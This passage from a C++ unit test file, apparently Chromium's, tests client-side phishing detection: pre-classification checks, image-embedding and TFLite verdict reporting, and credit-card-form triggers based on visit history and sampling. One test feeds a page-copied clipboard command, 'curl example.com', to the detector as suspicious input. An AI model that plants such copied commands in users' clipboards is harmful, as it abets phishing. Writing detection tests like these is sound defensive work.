  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  csd_host_->OnTextCopiedToClipboard(main_rfh(), u"curl example.com");
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi",
      PreClassificationCheckResult::CLASSIFY, 1);
}

TEST_F(ClientSideDetectionHostTest, NoImageEmbeddingMatchWithForcedRequest) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  SetFeatures({}, {});
  GURL example_url("http://example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(example_url);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  SetForceRequestInCache(true);

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;

  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(
                                 PartiallyEqualVerdict(verdict), _,
                                 "fake_access_token_for_force_request"))
      .WillOnce(MoveArg<1>(&cb));

  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict),
                        ClientSideDetectionType::IMAGE_EMBEDDING_MATCH);

  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token_for_force_request");

  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(example_url, false, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     true, 1);
}

TEST_F(ClientSideDetectionHostTest, NoImageEmbeddingMatchWithTfliteMatch) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  SetFeatures({}, {});
  GURL example_url("http://example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(example_url);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;

  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(true);
  verdict.set_is_tflite_match(true);
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token"))
      .WillOnce(MoveArg<1>(&cb));

  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict),
                        ClientSideDetectionType::IMAGE_EMBEDDING_MATCH);

  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token");

  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(example_url, false, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::TRIGGER_MODELS, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     false, 1);
}

TEST_F(ClientSideDetectionHostTest, ImageEmbeddingMatch) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  SetFeatures({}, {});
  GURL example_url("http://example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(example_url);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  ClientSideDetectionService::ClientReportPhishingRequestCallback cb;

  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(true);
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token"))
      .WillOnce(MoveArg<1>(&cb));

  SafeBrowsingTokenFetcher::Callback token_cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .Times(1)
      .WillRepeatedly(MoveArg<0>(&token_cb));

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict),
                        ClientSideDetectionType::IMAGE_EMBEDDING_MATCH);

  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(token_cb.is_null());
  std::move(token_cb).Run("fake_access_token");

  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run(example_url, false, net::HTTP_OK, std::nullopt);

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::IMAGE_EMBEDDING_MATCH, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     false, 1);
}

TEST_F(ClientSideDetectionHostTest,
       NoImageEmbeddingMatchWithNoTfliteMatchAndNoForceRequest) {
  base::HistogramTester histogram_tester;

  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
  SetFeatures({}, {});
  GURL example_url("http://example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url, false);
  ExpectPreClassificationChecks(example_url);
  NavigateAndCommit(example_url);
  WaitAndCheckPreClassificationChecks();

  ClientPhishingRequest verdict;
  verdict.set_url(example_url.spec());
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(PartiallyEqualVerdict(verdict), _,
                                              "fake_access_token"))
      .Times(0);

  EXPECT_CALL(*raw_token_fetcher_, Start(_)).Times(0);

  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict),
                        ClientSideDetectionType::IMAGE_EMBEDDING_MATCH);

  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_host_.get()));
  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::TRIGGER_MODELS, 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.RTLookupForceRequest",
                                     false, 1);
}

class ClientSideDetectionHostCreditCardFormTest
    : public ClientSideDetectionHostTestBase {
 public:
  ClientSideDetectionHostCreditCardFormTest()
      : ClientSideDetectionHostTestBase(false /*is_incognito*/) {}

  void SetUp() override {
    ClientSideDetectionHostTestBase::SetUp();

    ASSERT_TRUE(temp_dir_.CreateUniqueTempDir());

    history_dir_ = temp_dir_.GetPath().AppendASCII("HistoryServiceTest");
    ASSERT_TRUE(base::CreateDirectory(history_dir_));
    history_service_ = std::make_unique<history::HistoryService>();
    if (!history_service_->Init(
            history::TestHistoryDatabaseParamsForPath(history_dir_))) {
      history_service_.reset();
      ADD_FAILURE();
    }

    csd_host_->set_history_service_for_testing(history_service_.get());
  }

  void TearDown() override {
    if (!setup_called_) {
      return;
    }
    DCHECK(history_service_);

    csd_host_->HistoryServiceBeingDeleted(history_service_.get());

    base::RunLoop run_loop;
    history_service_->SetOnBackendDestroyTask(run_loop.QuitClosure());
    history_service_.reset();
    run_loop.Run();

    ClientSideDetectionHostTestBase::TearDown();
  }

  autofill::TestBrowserAutofillManager* autofill_manager() {
    return autofill_manager_injector_[web_contents()->GetPrimaryMainFrame()];
  }

  void NavigateAndWaitOnPreclassificationChecks(const GURL& url) {
    ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
    NavigateAndCommit(url);
    WaitUntilHighConfidenceAllowlistCheckDone();
    WaitAndCheckPreClassificationChecks();
  }

  // Creates a credit card form, where field types are determined by whether
  // the form has local or server predictions.
  // has_local_predictions:  Whether fields have a local heuristic identifying
  //                         it as a credit card type
  // has_server_predictions: Whether fields have a server heuristic
  //                         identifying it as a credit card type
  autofill::FormData CreateCreditCardForm(bool has_local_predictions = true,
                                          bool has_server_predictions = true) {
    autofill::FormData form_data = autofill::test::CreateTestCreditCardFormData(
        /*is_https=*/true, /*use_month_type=*/true);
    std::vector<autofill::FieldType> cc_field_types = {
        autofill::CREDIT_CARD_NAME_FULL,
        autofill::CREDIT_CARD_NUMBER,
        autofill::CREDIT_CARD_EXP_MONTH,
        autofill::CREDIT_CARD_VERIFICATION_CODE,
    };
    std::vector<autofill::FieldType> unknown_field_types(
        4, autofill::UNKNOWN_TYPE);
    std::vector<autofill::FieldType> no_server_field_types(
        4, autofill::NO_SERVER_DATA);
    auto local_field_types =
        has_local_predictions ? cc_field_types : no_server_field_types;
    auto server_field_types =
        has_server_predictions ? cc_field_types : no_server_field_types;
    autofill_manager()->AddSeenForm(form_data, local_field_types,
                                    server_field_types);
    return form_data;
  }

  // Combines ExpectTotalCount and ExpectBucketCount to verify that a histogram
  // has an expected value in one expected bucket and no other buckets.
  template <typename T>
  void ExpectOnlyBucketCount(std::string_view name,
                             T sample,
                             base::HistogramBase::Count32 expected_count) {
    histogram_tester_.ExpectTotalCount(name, expected_count);
    histogram_tester_.ExpectBucketCount(name, sample, expected_count);
  }

 protected:
  std::unique_ptr<history::HistoryService> history_service_;
  base::HistogramTester histogram_tester_;

 private:
  // All of these are needed in this order to get an AutofillManager that is
  // properly associated with web_contents().
  autofill::test::AutofillUnitTestEnvironment autofill_test_environment_;
  autofill::TestAutofillClientInjector<autofill::TestContentAutofillClient>
      autofill_client_injector_;
  autofill::TestAutofillDriverInjector<autofill::ContentAutofillDriver>
      autofill_driver_injector_;
  autofill::TestAutofillManagerInjector<autofill::TestBrowserAutofillManager>
      autofill_manager_injector_;

  base::ScopedTempDir temp_dir_;
  base::FilePath history_dir_;
};

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       NonCreditCardFormDoesNotTriggerPreclassificationChecks) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  csd_host_->RegisterAutofillManager();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  auto form_data = autofill::test::CreateTestEmailOrLoyaltyCardFormData();
  autofill_manager()->AddSeenForm(form_data, {autofill::EMAIL_ADDRESS});

  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());

  EXPECT_FALSE(future.IsReady());

  // The event was not even logged (before pre-classification).
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       UnclassifiedFormDoesNotTriggerPreclassificationChecks) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  csd_host_->RegisterAutofillManager();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  auto form_data = autofill::test::CreateTestUnclassifiedFormData();
  autofill_manager()->AddSeenForm(form_data, {autofill::UNKNOWN_TYPE});

  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());

  EXPECT_FALSE(future.IsReady());

  // The event was not even logged (before pre-classification).
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       WhenESBDisabledDoesNotTriggerPreclassificationChecks) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), false);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  // This should not actually register since ESB is disabled.
  csd_host_->RegisterAutofillManager();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  auto form_data = CreateCreditCardForm();

  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());

  EXPECT_FALSE(future.IsReady());

  // The event was not even logged (before pre-classification).
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       DoesNotProceedWithClassificationOnHCAcceptance) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormHCAcceptanceRate.name, "1.0"},
       {kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnCreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is enabled, but the host is included in the
  // HC allowlist, so classification will not occur.
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::NO_CLASSIFY_MATCH_HC_ALLOWLIST, 1);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 1);
  ExpectOnlyBucketCount("SBClientPhishing.MatchCSDAllowlistOnCreditCardForm",
                        false, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest, DoesNotProceedDueToSampling) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormHCAcceptanceRate.name, "0.0"},
       {kCsdCreditCardFormSampleRate.name, "0.0"},
       {kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnCreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  // The feature to send CSP pings is enabled, but because the sample rate
  // to send is 0%, classification does not occur.
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::NO_CLASSIFY_ALLOWLIST_METRIC, 1);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 1);
  ExpectOnlyBucketCount("SBClientPhishing.MatchCSDAllowlistOnCreditCardForm",
                        false, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       ProceedsWithClassificationOnNewSiteVisit) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
          {kCsdCreditCardFormMaxUserVisit.name, "1"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  // Record one visit in history for this URL.
  auto visit_time = base::Time::Now() -
                    base::Minutes(kCsdCreditCardFormUserVisitLookback.Get());
  history_service_->AddPage(url, visit_time, history::SOURCE_BROWSED);

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  // Pre-classification should have proceeded to classification.
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::CLASSIFY, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       DoesNotStartPreclassificationOnRepeatSiteVisit) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
          {kCsdCreditCardFormMaxUserVisit.name, "2"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  // Record three visits in history for this URL (one more than the max).
  auto visit_time = base::Time::Now() -
                    base::Minutes(kCsdCreditCardFormUserVisitLookback.Get());
  for (int i = 0; i < 3; i++) {
    history_service_->AddPage(url, visit_time, history::SOURCE_BROWSED);
  }

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  base::StatisticsRecorder::HistogramWaiter event_waiter(
      "SBClientPhishing.CreditCardFormEvent3");
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  event_waiter.Wait();

  // The Autofill field detection event should not have resulted in
  // triggering preclassification.
  EXPECT_FALSE(future.IsReady());

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kRepeatSiteVisitNoReferringAppAutofillServerHeuristic,
      1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       IgnoresVisitsInLookbackPeriod) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableNewSiteFilter.name, "true"},
          {kCsdCreditCardFormMaxUserVisit.name, "1"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  csd_host_->RegisterAutofillManager();

  // Record two visits in history: one that should be counted and another that
  // should be ignored because it is too recent.
  auto counted_visit_time =
      base::Time::Now() -
      base::Minutes(kCsdCreditCardFormUserVisitLookback.Get());
  auto ignored_visit_time =
      base::Time::Now() -
      base::Minutes(kCsdCreditCardFormUserVisitLookback.Get()) +
      base::Seconds(1);
  history_service_->AddPage(url, counted_visit_time, history::SOURCE_BROWSED);
  history_service_->AddPage(url, ignored_visit_time, history::SOURCE_BROWSED);

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  // First check: One visit counted. 1 > 1 is false, so it's a NewSiteVisit.
  // Preclassification SHOULD start.
  {
    ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
    base::StatisticsRecorder::HistogramWaiter event_waiter(
        "SBClientPhishing.CreditCardFormEvent3");
    autofill_manager()->OnFocusOnFormField(
        form_data, form_data.fields().begin()->global_id());
    event_waiter.Wait();
    WaitAndCheckPreClassificationChecks();

    EXPECT_EQ(future.Take(), ClientSideDetectionType::CREDIT_CARD_FORM);

    histogram_tester_.ExpectBucketCount(
        "SBClientPhishing.CreditCardFormEvent3",
        credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic,
        1);
  }

  // Now record two visits to a new host in history that should be counted.
  // Total counted visits = 2. 2 > 1 is true, so it should be a RepeatSiteVisit.
  // We navigate to a different URL to clear the host-level cache.
  GURL url2("http://host2.com/");
  for (int i = 0; i < 2; i++) {
    history_service_->AddPage(url2, counted_visit_time, history::SOURCE_BROWSED);
  }

  database_manager_->SetAllowlistLookupDetailsForUrl(url2, /*match=*/false);

  // This navigation will trigger a preclassification check (TRIGGER_MODELS).
  NavigateAndWaitOnPreclassificationChecks(url2);
  EXPECT_EQ(future.Take(), ClientSideDetectionType::TRIGGER_MODELS);

  auto form_data2 = CreateCreditCardForm();

  // Second check: 2 visits counted. 2 > 1 is true. RepeatSiteVisit.
  // Preclassification SHOULD NOT start.
  {
    base::StatisticsRecorder::HistogramWaiter event_waiter(
        "SBClientPhishing.CreditCardFormEvent3");
    autofill_manager()->OnFocusOnFormField(
        form_data2, form_data2.fields().begin()->global_id());
    event_waiter.Wait();

    EXPECT_FALSE(future.IsReady());

    histogram_tester_.ExpectBucketCount(
        "SBClientPhishing.CreditCardFormEvent3",
        credit_card_form::kRepeatSiteVisitNoReferringAppAutofillServerHeuristic,
        1);
  }

  // Total samples in the histogram should be 2.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3", 2);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       ProceedsWithClassificationOnLocalHeuristic) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableHeuristicFilter.name, "true"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm(
      /*has_local_predictions=*/true, /*has_server_predictions=*/false);

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  // Pre-classification should have proceeded to classification.
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillLocalHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::CLASSIFY, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       DoesNotStartPreclassificationOnServerHeuristic) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableHeuristicFilter.name, "true"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm(
      /*has_local_predictions=*/true, /*has_server_predictions=*/true);

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  base::StatisticsRecorder::HistogramWaiter event_waiter(
      "SBClientPhishing.CreditCardFormEvent3");
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  event_waiter.Wait();

  // The Autofill field detection event should not have resulted in
  // triggering preclassification.
  EXPECT_FALSE(future.IsReady());

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       PreclassificationIsDedupedByURL) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormSampleRate.name, "1.0"},
       {kCsdCreditCardFormEnableInteractionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester_.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3",
                                     0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.CreditCardFormDedupedEvent", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.HistoryServiceDuration.GetDailyVisitsToOrigin", 0);

  csd_host_->RegisterAutofillManager();

  // Trigger form field interaction, waiting for the event to be logged.
  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormDedupedEvent",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);

  // Trigger form field interaction a second time, which this time should
  // not do anything.
  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());
